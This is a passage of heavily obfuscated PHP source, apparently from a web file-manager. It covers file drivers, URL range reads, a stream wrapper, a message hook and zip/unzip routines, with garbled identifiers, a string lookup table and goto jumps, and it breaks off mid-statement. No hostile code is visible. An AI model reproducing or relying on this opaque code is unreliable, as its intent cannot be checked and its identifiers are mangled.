$ìŞÉşÃ ? $÷»¡òÑ[$ôôÀ†[208]] : $÷»¡òÑ[$ôôÀ†[207]]; } public function listAll($‚…Á²×) { $ì¸‘„…ë = IO::info($this->pathParse[$_SERVER[óó‹¸‚å][84]]); if (!$ì¸‘„…ë) { return array(); } return $this->model->listAll($‚…Á²×); } public function getContent($¢¨¬ÈšŠ) { return $this->model->getContent($¢¨¬ÈšŠ); } public function setContent($‚öÏ‘É¬, $õ‹ûÀ‰ = '') { return $this->model->setContent($‚öÏ‘É¬, $õ‹ûÀ‰); } public function fileSubstr($§ŞÓèúå, $ıíóÕô”, $¿ò•¾µÍ) { return $this->model->fileSubstr($§ŞÓèúå, $ıíóÕô”, $¿ò•¾µÍ); } public function download($€™š€’¢, $Âí®ÒÑî = '') { $›û¡ïÂˆ = get_path_father($Âí®ÒÑî); $…ñ„³„¤ = get_path_this($Âí®ÒÑî); $Ëğ¡ğÂï = $this->model->fileInfoGet($€™š€’¢); $£µ©ı× = IO::copy($Ëğ¡ğÂï[$_SERVER[óó‹¸‚å][84]], $›û¡ïÂˆ, !1, $…ñ„³„¤); return $£µ©ı×; } public function setModifyTime($İ®Ë±É, $‚áÙ‹ŠÆ = '') { $­»¡Æ½Æ =& $_SERVER[óó‹¸‚å]; if (!$İ®Ë±É) { return; } $this->model->where(array($­»¡Æ½Æ[417] => $İ®Ë±É))->save(array($­»¡Æ½Æ[85] => $‚áÙ‹ŠÆ)); } public function upload($·ƒ»‘¢, $ —Ï…ò, $ù´ç±˜á = false, $ûÏš•£Š = REPEAT_REPLACE) { $åÕ°­‹Ã =& $_SERVER[óó‹¸‚å]; $÷Æô°Éš = $this->parse($·ƒ»‘¢); $¦šå¶¸ê = $this->model->addFile($÷Æô°Éš[$åÕ°­‹Ã[399]], $ —Ï…ò, $÷Æô°Éš[$åÕ°­‹Ã[84]], $ù´ç±˜á, $ûÏš•£Š); return $this->getPathOuter($¦šå¶¸ê); } public function uploadFileByID($úÕ—¤Ç›, $¾ëÌæê, $½ùúö÷ü) { $àáùß¼¼ =& $_SERVER[óó‹¸‚å]; $æ‚×š»ª = $this->parse($úÕ—¤Ç›); $©çÈ¬Ô¤ = $this->model->addFileByFileID($æ‚×š»ª[$àáùß¼¼[399]], $¾ëÌæê, $æ‚×š»ª[$àáùß¼¼[84]], $½ùúö÷ü); return $this->getPathOuter($©çÈ¬Ô¤); } public function addFileByRemote($—ƒ§¸ìü, $‰ÊÎ†¥µ, $ŠûèŒÂ‡ = array(), $Î ûıª¾ = '', $—Ë¯šÑ») { $ú™€è¾ï =& $_SERVER[óó‹¸‚å]; $’ş¿ıªÄ = $this->parse($—ƒ§¸ìü); $Î ûıª¾ = empty($Î ûıª¾) ? $’ş¿ıªÄ[$ú™€è¾ï[84]] : $Î ûıª¾; $É˜¥™÷ß = $this->model->addFileByRemote($’ş¿ıªÄ[$ú™€è¾ï[399]], $‰ÊÎ†¥µ, $Î ûıª¾, $ŠûèŒÂ‡, $—Ë¯šÑ»); return $this->getPathOuter($É˜¥™÷ß); } public function uploadLink($‰ıÑè¦, $†ˆâÜ”ˆ = 0) { $äôÇ¦İ† =& $_SERVER[óó‹¸‚å]; $¿Ù²íª = $this->parse($‰ıÑè¦); $åÌ‚´ç = _get($GLOBALS[$äôÇ¦İ†[7]], $äôÇ¦İ†[1345]); $·Áòúê = _get($GLOBALS[$äôÇ¦İ†[7]], $äôÇ¦İ†[1346]); $‰ıÑè¦ = Model($äôÇ¦İ†[609])->createFileName($¿Ù²íª[$äôÇ¦İ†[84]], $åÌ‚´ç, $·Áòúê); return IO::uploadLink($‰ıÑè¦, $†ˆâÜ”ˆ); } public function fileNameAuto($Ì¶ôúµ, $¹‹šİŠç, $äà¥Ö¥ = REPEAT_REPLACE, $ÖïÀ†ÖÖ = false) { return $this->model->fileNameAuto($Ì¶ôúµ, $¹‹šİŠç, $äà¥Ö¥, $ÖïÀ†ÖÖ); } public function fileNameExist($ÏŠ¹úüä, $Ğ™¯ø¼ı) { return $this->model->fileNameExist($ÏŠ¹úüä, $Ğ™¯ø¼ı); } protected function _fileOut($çÛÍ¹®¸, $ßÊéŸÂ† = false, $¥ĞÛÀø = false, $àÍ·îä = '', $°ì«âŞ = false) { $Ü¹×Š²¥ =& $_SERVER[óó‹¸‚å]; $ì¸Ğâó¶ = $this->model->sourceInfo($çÛÍ¹®¸); if ($ì¸Ğâó¶[$Ü¹×Š²¥[410]] == $Ü¹×Š²¥[88]) { header($Ü¹×Š²¥[1347]); die; } $æŒïÓë = $this->model->fileInfoGet($çÛÍ¹®¸); $àÍ·îä = $æŒïÓë[$Ü¹×Š²¥[176]] ? $æŒïÓë[$Ü¹×Š²¥[176]] : $àÍ·îä; $Õ…›…åØ = isset($GLOBALS[$Ü¹×Š²¥[1348]]) ? $GLOBALS[$Ü¹×Š²¥[1348]] : $ì¸Ğâó¶[$Ü¹×Š²¥[32]]; if ($°ì«âŞ) { return IO::fileOutServer($æŒïÓë[$Ü¹×Š²¥[84]], $ßÊéŸÂ†, $Õ…›…åØ, $àÍ·îä); } IO::fileOut($æŒïÓë[$Ü¹×Š²¥[84]], $ßÊéŸÂ†, $Õ…›…åØ, $àÍ·îä); } public function fileOut($æ£ÆÖ, $»¶´Ó¦¶ = false, $¤şùˆ…¦ = false, $¸ªüí‡ = '') { $this->_fileOut($æ£ÆÖ, $»¶´Ó¦¶, $¤şùˆ…¦, $¸ªüí‡); } public function fileOutServer($„Û¼üÖª, $¢Ê¬ÓŞ = false, $‹û¢àÁ = false, $×ÃÒ¿Ùµ = '') { $this->_fileOut($„Û¼üÖª, $¢Ê¬ÓŞ, $‹û¢àÁ, $×ÃÒ¿Ùµ, !0); } protected function _fileOutImage($òá¼˜õÀ, $Ô®ÜúÃ = 250) { $ô’Œ½—“ =& $_SERVER[óó‹¸‚å]; $¼®‚Æ¾ = $this->model->pathInfo($òá¼˜õÀ); if ($¼®‚Æ¾[$ô’Œ½—“[410]] == $ô’Œ½—“[88]) { show_json($ô’Œ½—“[1349] . $òá¼˜õÀ, !1); } $Á¡ÉÑ¢× = $this->model->fileInfoGet($òá¼˜õÀ); $Á¡ÉÑ¢×[$ô’Œ½—“[32]] = $¼®‚Æ¾[$ô’Œ½—“[32]]; $Á¡ÉÑ¢×[$ô’Œ½—“[169]] = $¼®‚Æ¾[$ô’Œ½—“[169]]; $GLOBALS[$ô’Œ½—“[1348]] = $Á¡ÉÑ¢×[$ô’Œ½—“[32]]; $GLOBALS[$ô’Œ½—“[168]] = $Á¡ÉÑ¢×; IO::fileOutImage($Á¡ÉÑ¢×[$ô’Œ½—“[84]], $Ô®ÜúÃ); } public function fileOutImage($ŠØşóáç, $Ì¯ ¼€” = 250) { $this->_fileOutImage($ŠØşóáç, $Ì¯ ¼€”); } public function fileOutImageServer($ÆÒŒªé´, $Â­»­Øã = 250) { $this->_fileOutImage($ÆÒŒªé´, $Â­»­Øã); } public function link($„ÎìâÒ, $ÊçÆë³ = '') { $ë¦ğªĞ¶ = $this->model->fileInfoGet($„ÎìâÒ); return IO::link($ë¦ğªĞ¶[$_SERVER[óó‹¸‚å][84]], $ÊçÆë³); } protected function parse($·öîƒ·–) { $„îì²õ =& $_SERVER[óó‹¸‚å]; if (strstr($·öîƒ·–, $„îì²õ[8]) === !1) { return array($„îì²õ[419] => intval($·öîƒ·–), $„îì²õ[84] => $„îì²õ[12], $„îì²õ[1344] => array()); } $Î¡’†›û = explode($„îì²õ[8], trim($·öîƒ·–, $„îì²õ[8])); if (count($Î¡’†›û) < 2) { show_tips(clear_html($·öîƒ·–) . $„îì²õ[1350]); } return array($„îì²õ[419] => intval($Î¡’†›û[0]), $„îì²õ[84] => $Î¡’†›û[1], $„îì²õ[1344] => array_slice($Î¡’†›û, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($İ¡²ßä„) { $this->pathParse = $İ¡²ßä„; $this->model = Model($_SERVER[óó‹¸‚å][1343]); } public function getPathOuter($‡•§ïª) { $ß¼ö®Ö =& $_SERVER[óó‹¸‚å]; if (!$‡•§ïª) { return $‡•§ïª; } $×ÃõêÍø = $this->parse($‡•§ïª); return trim(KodIO::makeShare($this->pathParse[$ß¼ö®Ö[399]], $×ÃõêÍø[$ß¼ö®Ö[399]]), $ß¼ö®Ö[8]); } protected function infoParse($¸š‰§ôÑ, $á´’úÁ¦ = false, $š¿øí = false) { $ÌÈ÷Îù =& $_SERVER[óó‹¸‚å]; $íŒ³óë = $this->pathParse[$ÌÈ÷Îù[399]]; $…’ÍííÒ = trim($this->pathParse[$ÌÈ÷Îù[1176]], $ÌÈ÷Îù[8]); return Action($ÌÈ÷Îù[1351])->sharePathInfo($íŒ³óë, $…’ÍííÒ, $á´’úÁ¦); } public function infoFull($­…ëôµ) { $ÓØóõ´ =& $_SERVER[óó‹¸‚å]; $¨ß˜Œèä = explode($ÓØóõ´[8], trim($­…ëôµ, $ÓØóõ´[8])); if (count($¨ß˜Œèä) > 1) { $–ƒíáø = implode($ÓØóõ´[8], array_splice($¨ß˜Œèä, 1)); $øÅÖ¨°Å = $this->model->pathInfoByPath($¨ß˜Œèä[0], $–ƒíáø); if (!$øÅÖ¨°Å) { return !1; } $this->pathParse[$ÓØóõ´[1176]] = $øÅÖ¨°Å[$ÓØóõ´[402]]; } return $this->infoParse($­…ëôµ); } public function listAll($”‚¡–ë¾) { $Ş÷…ú«† =& $_SERVER[óó‹¸‚å]; $•şó‘‹× = IO::info($this->pathParse[$Ş÷…ú«†[84]]); if (!$•şó‘‹×) { return array(); } $Æ‰÷Í¢µ = $this->model->listAll($”‚¡–ë¾); $º´‰´Œö = Model($Ş÷…ú«†[601])->getInfo($•şó‘‹×[$Ş÷…ú«†[489]]); $ãİœÍÊø = Action($Ş÷…ú«†[1351]); foreach ($Æ‰÷Í¢µ as &$ÎæÙÍª®) { check_abort(); $ÎæÙÍª®[$Ş÷…ú«†[86]] = $ãİœÍÊø->_shareItemeParse($ÎæÙÍª®[$Ş÷…ú«†[86]], $º´‰´Œö); } unset($ÎæÙÍª®); return $Æ‰÷Í¢µ; } } goto d¢»·Ì¼‚š; CŠèÉ¶°Ä³: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ªæŠ–ˆœ = false) { } public function exist($Ë€«˜ü) { $õµ·ñåÅ = $this->info($Ë€«˜ü); return $õµ·ñåÅ[$_SERVER[óó‹¸‚å][201]]; } public function isFile($‡ÖŒÈ‡¬) { $„·©øüü = $this->info($‡ÖŒÈ‡¬); return $„·©øüü[$_SERVER[óó‹¸‚å][201]]; } public function isFolder($™Ûçõ‡) { return !1; } public function size($¶äïëº¹) { $¯šœß» = $this->info($¶äïëº¹); return $¯šœß»[$_SERVER[óó‹¸‚å][76]]; } public function info($¬€£í) { return $this->infoParse($¬€£í); } public function infoAuth($¾¶Üî³÷) { return $this->infoParse($¾¶Üî³÷); } public function infoWithChildren($Ù¥Öƒ‚¨) { return $this->infoParse($Ù¥Öƒ‚¨); } public function infoFull($ş‘ŒíÀ§) { return $this->infoParse($ş‘ŒíÀ§); } private function infoParse($òö“—•£) { $·¢½¸¯ï =& $_SERVER[óó‹¸‚å]; $ó•†—ğ£ = $this->header($òö“—•£); if (!$ó•†—ğ£ || !$ó•†—ğ£[$·¢½¸¯ï[754]]) { return !1; } $¹Æê¹ = _get($ó•†—ğ£, $·¢½¸¯ï[337], 0); $Ú¼¡…©— = array($·¢½¸¯ï[32] => $ó•†—ğ£[$·¢½¸¯ï[32]], $·¢½¸¯ï[84] => $òö“—•£, $·¢½¸¯ï[33] => $·¢½¸¯ï[199], $·¢½¸¯ï[76] => intval($¹Æê¹), $·¢½¸¯ï[174] => get_path_ext($ó•†—ğ£[$·¢½¸¯ï[32]]), $·¢½¸¯ï[1395] => $¹Æê¹ > 0 && $ó•†—ğ£[$·¢½¸¯ï[1518]], $·¢½¸¯ï[1396] => !1); return $Ú¼¡…©—; } private function header($ÄÂ‰¬Ñ§) { $ ¨–£·Ò =& $_SERVER[óó‹¸‚å]; if (isset(self::$_cacheHeader[$ÄÂ‰¬Ñ§])) { return self::$_cacheHeader[$ÄÂ‰¬Ñ§]; } $âû¤ÂÏ¤ = isset($GLOBALS[$ ¨–£·Ò[1519]]) ? $GLOBALS[$ ¨–£·Ò[1519]] : !1; $GLOBALS[$ ¨–£·Ò[1519]] = !0; self::$_cacheHeader[$ÄÂ‰¬Ñ§] = url_header($ÄÂ‰¬Ñ§); $GLOBALS[$ ¨–£·Ò[1519]] = $âû¤ÂÏ¤; return self::$_cacheHeader[$ÄÂ‰¬Ñ§]; } public function hashSimple($‰Ÿ ‹´¡, $¨…’Óõ¿ = false) { $ñÚü¹³ =& $_SERVER[óó‹¸‚å]; $ğ®şÉ•ú = $this->info($‰Ÿ ‹´¡); if (!$ğ®şÉ•ú || !$ğ®şÉ•ú[$ñÚü¹³[201]]) { return !1; } $¸÷ìƒêÖ = $ğ®şÉ•ú[$ñÚü¹³[76]]; $õÍÀ¼ì¹ = 200; $ğ®Ë›åô = 50; if ($¸÷ìƒêÖ <= $õÍÀ¼ì¹ * $ğ®Ë›åô) { return md5($this->fileSubstr($‰Ÿ ‹´¡, 0, $¸÷ìƒêÖ)) . $¸÷ìƒêÖ; } $¢¶Ûªî = intval($¸÷ìƒêÖ / $ğ®Ë›åô); $Ãó•¨ı = $ñÚü¹³[12]; $îÇÄîš™ = timeFloat(); $úò£Åö = 15; for ($ğÙğ÷¶… = 0; $ğÙğ÷¶… < $ğ®Ë›åô; $ğÙğ÷¶…++) { if (timeFloat() - $îÇÄîš™ > $úò£Åö) { return !1; } $Å‚ºåˆá = $this->fileSubstr($‰Ÿ ‹´¡, $¢¶Ûªî * $ğÙğ÷¶…, $õÍÀ¼ì¹); if (!$Å‚ºåˆá) { return !1; } $Ãó•¨ı .= $Å‚ºåˆá; } $Ãó•¨ı .= $this->fileSubstr($‰Ÿ ‹´¡, $¸÷ìƒêÖ - $õÍÀ¼ì¹, $õÍÀ¼ì¹); return md5($Ãó•¨ı) . $¸÷ìƒêÖ; } public function getContent($–Ñ’Šîö) { return $this->fileSubstr($–Ñ’Šîö); } public function fileSubstr($œø”Û›Ò, $ì­‰Šî¢ = 0, $í‰•îÜ¿ = -1) { $êã£òÕç =& $_SERVER[óó‹¸‚å]; $Ø¿£ÍÔö = $this->info($œø”Û›Ò); if (!$Ø¿£ÍÔö || !$Ø¿£ÍÔö[$êã£òÕç[201]] && $Ø¿£ÍÔö[$êã£òÕç[76]] > 1024 * 1024 * 10) { return !1; } if ($í‰•îÜ¿ === -1) { $í‰•îÜ¿ = $Ø¿£ÍÔö[$êã£òÕç[76]]; } if ($í‰•îÜ¿ == 0) { return $êã£òÕç[12]; } $ôí§ÍÄ´ = array($êã£òÕç[1520] . $ì­‰Šî¢ . $êã£òÕç[786] . ($ì­‰Šî¢ + $í‰•îÜ¿ - 1)); $«Ë’ü Ò = url_request($œø”Û›Ò, $êã£òÕç[230], !1, $ôí§ÍÄ´, !1, !1, 30); return $«Ë’ü Ò[$êã£òÕç[1210]] ? $«Ë’ü Ò[$êã£òÕç[1210]] : $êã£òÕç[12]; } public function download($¨ƒø¢¤ƒ, $ø¡Öäæ) { Downloader::start($¨ƒø¢¤ƒ, $ø¡Öäæ); return $ø¡Öäæ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¥„¿ª×», $¢²Ô…“Œ = '') { $this->info = $this->info($¥„¿ª×»); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[óó‹¸‚å][84]]; $this->pathOpen = $¥„¿ª×»; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¥„¿ª×»])) { self::$_chunkBuffer[$¥„¿ª×»] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($×±øîã) { $Ùº‘Œõ = $this->fileSubstr($this->pose, $×±øîã); $this->pose += strlen($Ùº‘Œõ); return $Ùº‘Œõ; } public function stream_tell() { return $this->pose; } public function stream_seek($ø¢š«Êù, $ÏÙÌ¯Šà) { $ûÏá =& $_SERVER[óó‹¸‚å]; if ($ÏÙÌ¯Šà == SEEK_SET) { $this->pose = $ø¢š«Êù; } else { if ($ÏÙÌ¯Šà == SEEK_CUR) { $this->pose += $ø¢š«Êù; } else { if ($ÏÙÌ¯Šà == SEEK_END) { $this->pose = $this->info[$ûÏá[76]] + intval($ø¢š«Êù); } } } if ($ø¢š«Êù < 0) { $this->pose = $this->info[$ûÏá[76]] + $ø¢š«Êù; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[óó‹¸‚å][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($„øÙÌìÄ, $®†ûí¶Ì) { $íÊµ¤Œ =& $_SERVER[óó‹¸‚å]; $œ»à×ÙŞ = $this->info($„øÙÌìÄ); return array($íÊµ¤Œ[1521] => 0, $íÊµ¤Œ[1522] => 0, $íÊµ¤Œ[16] => 32768 + 511, $íÊµ¤Œ[1523] => 0, $íÊµ¤Œ[1524] => 0, $íÊµ¤Œ[1525] => 0, $íÊµ¤Œ[1526] => 0, $íÊµ¤Œ[76] => $œ»à×ÙŞ[$íÊµ¤Œ[76]], $íÊµ¤Œ[1527] => $œ»à×ÙŞ[$íÊµ¤Œ[1394]], $íÊµ¤Œ[1483] => $œ»à×ÙŞ[$íÊµ¤Œ[85]], $íÊµ¤Œ[1482] => $œ»à×ÙŞ[$íÊµ¤Œ[200]], $íÊµ¤Œ[1528] => 0, $íÊµ¤Œ[1529] => 0); } static $fileInfo = array(); public function info($£åÆ…Ä÷) { $õ§Ú‚ãà = $_SERVER[óó‹¸‚å][1530]; if (isset(self::$fileInfo[$£åÆ…Ä÷])) { return self::$fileInfo[$£åÆ…Ä÷]; } if (substr($£åÆ…Ä÷, 0, strlen($õ§Ú‚ãà)) != $õ§Ú‚ãà) { return !1; } self::$fileInfo[$£åÆ…Ä÷] = IO::info(substr($£åÆ…Ä÷, strlen($õ§Ú‚ãà))); return self::$fileInfo[$£åÆ…Ä÷]; } public static function read($´¯¬ú¨¯, $•¿³Û÷Û, $”÷ª»˜Ë) { if (!isset(self::$_fopenCache[$´¯¬ú¨¯])) { $½«·Ç±ˆ = new StreamWrapperIO(); $½«·Ç±ˆ->stream_open($´¯¬ú¨¯); self::$_fopenCache[$´¯¬ú¨¯] = $½«·Ç±ˆ; } $½«·Ç±ˆ = self::$_fopenCache[$´¯¬ú¨¯]; return $½«·Ç±ˆ->fileSubstr($•¿³Û÷Û, $”÷ª»˜Ë); } public static function _read($¿àìé¢¶, $ÔÁ©ı†, $Ñˆ›¬«”) { $–­ÙÓĞê =& $_SERVER[óó‹¸‚å]; $Éıë¦•Ÿ = fopen($¿àìé¢¶, $–­ÙÓĞê[1398]); if (!$Éıë¦•Ÿ) { return $–­ÙÓĞê[12]; } $ì ¥× = 8192; fseek($Éıë¦•Ÿ, $ÔÁ©ı†, SEEK_SET); $…íùâ‚œ = $–­ÙÓĞê[12]; $Õ˜àÒ = 0; while ($Õ˜àÒ < $Ñˆ›¬«”) { $¤‚çìºç = min($ì ¥×, $Ñˆ›¬«” - $Õ˜àÒ); $…íùâ‚œ .= fread($Éıë¦•Ÿ, $¤‚çìºç); $Õ˜àÒ += $¤‚çìºç; } fclose($Éıë¦•Ÿ); return $…íùâ‚œ; } public function fileSubstr($ø¡õØ–‚, $¨Şá£õå) { $éß†¡ÛÇ =& $_SERVER[óó‹¸‚å]; $¶Ş¹®© = $this->info[$éß†¡ÛÇ[76]]; $çÂÀáÓ… = $ø¡õØ–‚; $´ÖáÜÓ = $¨Şá£õå; if ($ø¡õØ–‚ < 0) { $ø¡õØ–‚ = $¶Ş¹®© + $ø¡õØ–‚; } if ($¨Şá£õå === !1) { $¨Şá£õå = $¶Ş¹®© - $ø¡õØ–‚; } if ($ø¡õØ–‚ + $¨Şá£õå > $¶Ş¹®©) { $¨Şá£õå = $¶Ş¹®© - $ø¡õØ–‚; } if ($¨Şá£õå <= 0) { return $éß†¡ÛÇ[12]; } if ($ø¡õØ–‚ < 0 || $ø¡õØ–‚ >= $¶Ş¹®© || $¨Şá£õå <= 0 || $¨Şá£õå > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\x6c\x65\x52\x65\141\144\40\145\162\x72\157\x72\41\40\163\x74\141\x72\x74\x3d{$ø¡õØ–‚}\73\x6c\145\x6e\147\x74\150\x3d{$¨Şá£õå}\73\40\163\151\x7a\x65\75{$¶Ş¹®©}\73"); } $ ¼Ø­ê = 64 * 1024; $·‹ö¶ßÏ =& self::$_chunkBuffer[$this->path]; if (!$·‹ö¶ßÏ) { $·‹ö¶ßÏ = array(); } $áúŞÊøŞ = 0; $úí¹¬½– = 0; $Ì¢ÍÔãí = $éß†¡ÛÇ[12]; foreach ($·‹ö¶ßÏ as $áúŞÊøŞ => $Ì¢ÍÔãí) { $áúŞÊøŞ = intval($áúŞÊøŞ); $úí¹¬½– = $áúŞÊøŞ + strlen($Ì¢ÍÔãí); if ($ø¡õØ–‚ >= $úí¹¬½–) { continue; } if ($ø¡õØ–‚ >= $áúŞÊøŞ && $ø¡õØ–‚ + $¨Şá£õå <= $úí¹¬½–) { return substr($Ì¢ÍÔãí, $ø¡õØ–‚ - $áúŞÊøŞ, $¨Şá£õå); } break; } if (count($·‹ö¶ßÏ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($éß†¡ÛÇ[1531], $éß†¡ÛÇ[1532] . count($·‹ö¶ßÏ) . "\x3b\x73\x74\141\162\x74\x3d{$ø¡õØ–‚}\54\x6c\x65\x6e\x67\164\x68\75{$¨Şá£õå}\73\x70\x6f\163\145\x3a{$áúŞÊøŞ}\176{$úí¹¬½–}"); throw new Exception($éß†¡ÛÇ[1533]); } $Œ—¯şŒ = intval($ø¡õØ–‚ / $ ¼Ø­ê) * $ ¼Ø­ê; $Ï²¿Æ±½ = ceil(($ø¡õØ–‚ + $¨Şá£õå) / $ ¼Ø­ê) * $ ¼Ø­ê - $Œ—¯şŒ; $÷¡’Š´¨ = IO::fileSubstr($this->path, $Œ—¯şŒ, $Ï²¿Æ±½); $·‹ö¶ßÏ[$Œ—¯şŒ . $éß†¡ÛÇ[12]] = $÷¡’Š´¨; ksort($·‹ö¶ßÏ); $£ÁŞÊáœ = substr($÷¡’Š´¨, $ø¡õØ–‚ - $Œ—¯şŒ, $¨Şá£õå); return $£ÁŞÊáœ; } private function log($ÃÃª‘¾¼, $¹äëíè) { $×­±Šû¹ =& $_SERVER[óó‹¸‚å]; $½öÆş‰ = timeFloat() - $this->timeStart; write_log(sprintf($×­±Šû¹[1534], $ÃÃª‘¾¼, $this->info[$×­±Šû¹[32]], $½öÆş‰, $¹äëíè), $×­±Šû¹[1190]); } } class Message { function __construct() { } public function send($»ß•ù•³ = '', $ùÅÚÌ¯ = array(), $ŠÊí¼Û£ = "\x74\145\x78\164") { $º÷µà› =& $_SERVER[óó‹¸‚å]; $ÓÆì•˜Š = array($º÷µà›[33] => $º÷µà›[1535], $º÷µà›[759] => $»ß•ù•³); if (in_array($ŠÊí¼Û£, array($º÷µà›[1535], $º÷µà›[1536]))) { $ÓÆì•˜Š[$º÷µà›[33]] = $ŠÊí¼Û£; } $ùÅÚÌ¯ = array($º÷µà›[515] => isset($ùÅÚÌ¯[$º÷µà›[515]]) ? $ùÅÚÌ¯[$º÷µà›[515]] : $º÷µà›[12], $º÷µà›[600] => isset($ùÅÚÌ¯[$º÷µà›[600]]) ? $ùÅÚÌ¯[$º÷µà›[600]] : $º÷µà›[12]); if (empty($»ß•ù•³) || empty($ùÅÚÌ¯[$º÷µà›[515]]) && empty($ùÅÚÌ¯[$º÷µà›[600]])) { return !1; } $Ë×øâ¹ô = array($º÷µà›[1476] => $ÓÆì•˜Š, $º÷µà›[1537] => $ùÅÚÌ¯); Hook::trigger($º÷µà›[1538], $Ë×øâ¹ô); } } goto cçœƒÖ±‘; f–ŞŞò™ï‹: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¿“™µ“¯; if ($¿“™µ“¯) { return $¿“™µ“¯; } $“ÈºŒ‰¢ = IO::init($_SERVER[óó‹¸‚å][8]); return $“ÈºŒ‰¢; } private static function iconvSystem($ßµµŠ£º) { return self::local()->iconvSystem($ßµµŠ£º); } private static function iconvApp($¥®å¡Š¸) { return self::local()->iconvApp($¥®å¡Š¸); } public static function zipFolder($¬ğª…ñÎ, $ùäñ÷»Ü = "\x7a\x69\x70", $–óÈ–’€ = '', $²‰¼Ë = REPEAT_RENAME) { $‡Í†ãâ˜ =& $_SERVER[óó‹¸‚å]; $´õ·±† = IO::listPath($¬ğª…ñÎ); if (!$´õ·±†) { return !1; } $´õ·±† = array_merge($´õ·±†[$‡Í†ãâ˜[82]], $´õ·±†[$‡Í†ãâ˜[83]]); return self::zip($´õ·±†, $ùäñ÷»Ü, $–óÈ–’€, $²‰¼Ë); } public static function zip($³Äü¦É¤, $ø›€ƒü“ = "\x7a\x69\x70", $üÌ•€û… = '', $¿Ø«•ãº = REPEAT_RENAME) { $ºôİÁİ =& $_SERVER[óó‹¸‚å]; if (is_string($³Äü¦É¤) && $³Äü¦É¤) { $³Äü¦É¤ = array(array($ºôİÁİ[84] => $³Äü¦É¤)); } $ô’´ô¾‘ = self::init($³Äü¦É¤[0][$ºôİÁİ[84]]); $ò³®´ÙÂ = self::info($³Äü¦É¤[0][$ºôİÁİ[84]]); $‚°ËÕÇ = $ºôİÁİ[12]; $íåºÉò³ = $ºôİÁİ[12]; $Î¾‡²Ï = $ºôİÁİ[12]; if ($üÌ•€û…) { $íåºÉò³ = get_path_father($üÌ•€û…); $Î¾‡²Ï = get_path_this($üÌ•€û…); } else { $íåºÉò³ = self::pathFather($ò³®´ÙÂ[$ºôİÁİ[84]]); $Î¾‡²Ï = $ò³®´ÙÂ[$ºôİÁİ[32]] . $ºôİÁİ[10] . $ø›€ƒü“; if (count($³Äü¦É¤) > 1) { $œú…ªù = IO::info($íåºÉò³); $Î¾‡²Ï = $œú…ªù[$ºôİÁİ[32]] . $ºôİÁİ[10] . $ø›€ƒü“; } } if ($ô’´ô¾‘->getType() == $ºôİÁİ[106]) { $É¢·Ô¯ü = self::init($íåºÉò³); $ğëß½¬› = $É¢·Ô¯ü->getType() == $ºôİÁİ[106] ? $íåºÉò³ : get_path_father($ô’´ô¾‘->path); $ğëß½¬› = rtrim($ğëß½¬›, $ºôİÁİ[8]) . $ºôİÁİ[8]; mk_dir($ğëß½¬›); } else { $‚°ËÕÇ = TEMP_FILES . $ºôİÁİ[1191] . time() . rand_string(8) . $ºôİÁİ[8]; mk_dir($‚°ËÕÇ); file_put_contents($‚°ËÕÇ . $ºôİÁİ[1192], $ºôİÁİ[12]); $ğëß½¬› = $‚°ËÕÇ; } $î›Ìñ¥¿ = IO::info($ğëß½¬›); if (!$î›Ìñ¥¿ || !$î›Ìñ¥¿[$ºôİÁİ[202]]) { show_json(LNG($ºôİÁİ[1193]), !1); } $ïåÌ¡´È = self::zipFileList($³Äü¦É¤, $‚°ËÕÇ); foreach ($ïåÌ¡´È as $ì±¹µ¡º => $æ¶ç„á) { $ïåÌ¡´È[$ì±¹µ¡º] = self::iconvSystem($æ¶ç„á); } $Ô§ö‡Œ© = get_filename_auto($ğëß½¬› . $Î¾‡²Ï, $ºôİÁİ[12], $¿Ø«•ãº); KodArchive::create(self::iconvSystem($Ô§ö‡Œ©), $ïåÌ¡´È); if (!IO::exist($Ô§ö‡Œ©)) { if ($‚°ËÕÇ) { del_dir($‚°ËÕÇ); } show_json(LNG($ºôİÁİ[1194]), !1); } if (!$‚°ËÕÇ) { return $Ô§ö‡Œ©; } $°üÍº = self::move($Ô§ö‡Œ©, $íåºÉò³, $¿Ø«•ãº); if ($‚°ËÕÇ) { del_dir($‚°ËÕÇ); } if (!$Ô§ö‡Œ©) { show_json(LNG($ºôİÁİ[1194]), !1); } return $°üÍº; } public static function unzip($¢«×¢§, $éÇàÊŒ¸, $÷›“Ï«À = "\x2d\x31", $ûàò¦¼ù = "\162\145\160\x6c\x61\143\x65") { $˜ºÄË¯ï =& $_SERVER[óó‹¸‚å]; $ ŸİÄîÀ = parent::info($¢«×¢§); if (!$ ŸİÄîÀ) { show_json(LNG($˜ºÄË¯ï[1195]), !1); } $ƒ÷Î—°— = IO::infoFull($éÇàÊŒ¸); if (!$ƒ÷Î—°—) { $éÇàÊŒ¸ = IO::mkdir($éÇàÊŒ¸); } if (isset($ƒ÷Î—°—[$˜ºÄË¯ï[402]]) && trim($ƒ÷Î—°—[$˜ºÄË¯ï[84]], $˜ºÄË¯ï[8]) != trim($éÇàÊŒ¸, $˜ºÄË¯ï[8])) { $¢¤ÕÈäª = KodIO::make($ƒ÷Î—°—[$˜ºÄË¯ï[432]]); $ÇğÊéÊ = IO::fileNameAuto($¢¤ÕÈäª, $ƒ÷Î—°—[$˜ºÄË¯ï[32]], REPEAT_RENAME_FOLDER, !0); $éÇàÊŒ¸ = IO::mkdir($¢¤ÕÈäª . $ÇğÊéÊ); } $÷›“Ï«À = $÷›“Ï«À && $÷›“Ï«À != $˜ºÄË¯ï[1196] ? @json_decode($÷›“Ï«À, !0) : -1; $¯­É»‚ = self::unzipPart($¢«×¢§, $÷›“Ï«À); if (!$¯­É»‚ || !IO::exist($¯­É»‚[$˜ºÄË¯ï[199]])) { show_json(LNG($˜ºÄË¯ï[105]), !1); } $„äôşå« = 